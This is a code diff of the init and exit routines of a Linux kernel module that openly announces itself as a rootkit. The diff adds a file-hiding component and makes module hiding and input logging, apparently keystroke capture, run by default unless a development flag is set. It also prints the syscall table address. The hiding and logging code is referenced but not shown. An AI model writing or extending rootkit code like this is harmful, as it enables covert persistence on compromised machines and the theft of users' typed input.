@@ -4,28 +4,31 @@
 #include <linux/kernel.h>	 // For KERN_INFO
 #include <linux/init.h>	
 
-
+#include "constants.h"
 #include "logInput.h"
 #include "moduleHide.h"
+#include "fileHide.h"
 #include "outputDevice.h"
-
-#define NOHIDE		// Needed if you intend to be able to unload/reload the module without rebooting
 
 static int __init main_init(void) {
 	int error;
 	printk(KERN_INFO "Installing rootkit. Compiled: %s %s\n", __TIME__, __DATE__); // TODO: print time etc..
+   printk(KERN_INFO "Syscall table is located at: %p\n", SYSCALL_TABLE);
 
 	
 	error = outputDevice_init();
 	if (error) return error;
 
+#ifndef DEV_MODE
 	error = logInput_init();
 	if (error) return error;
 
-#ifndef NOHIDE
-	error = moduleHide_init();
+	error = moduleHide_start();
 	if (error) return error;
 #endif
+
+	error = fileHide_start();
+	if (error) return error;
 
 	printk(KERN_INFO "Rootkit installed\n");
 	return 0;
@@ -33,10 +36,11 @@ static int __init main_init(void) {
 
 static void __exit main_exit(void) {
 	
-#ifndef NOHIDE
-	moduleHide_exit();
-#endif
+	fileHide_stop();
+#ifndef DEV_MODE
+	moduleHide_stop();
 	logInput_exit();
+#endif
 	outputDevice_exit();
 
 	printk(KERN_INFO "Rootkit uninstalled\n");
